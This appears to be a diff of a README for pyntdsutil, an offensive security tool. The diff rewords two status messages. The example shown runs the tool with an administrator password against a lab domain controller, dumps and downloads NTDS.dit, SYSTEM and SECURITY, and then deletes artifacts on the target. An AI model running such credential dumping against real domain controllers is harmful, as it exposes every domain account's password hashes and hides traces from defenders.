@@ -14,12 +14,12 @@ python3 -m pipx install git+https://github.com/mrdanielvelez/pyntdsutil
 ```javascript
 # pyntdsutil CRASH.LAB/Administrator:'Welcome1234!'@192.168.40.136      
 [*] Connected to 192.168.40.136 as CRASH.LAB\Administrator (Admin!)
-[*] Artifacts must be cleaned up manually if pyntdsutil is abruptly terminated
+[*] Abrupt termination may impact artifact cleanup
 [*] Dumping NTDS.dit with ntdsutil.exe
 [*] Successfully dumped NTDS.dit
 [*] Downloading NTDS.dit, SYSTEM, and SECURITY
 [*] Output files to pyntdsutil_2023-10-12_00:17:22
-[*] Deleted artifacts on 192.168.40.136
+[*] Deleted artifacts on 192.168.40.136 and closed connection
 
 # ls pyntdsutil_2023-10-12_00:17:22
 NTDS.dit  SECURITY  SYSTEM
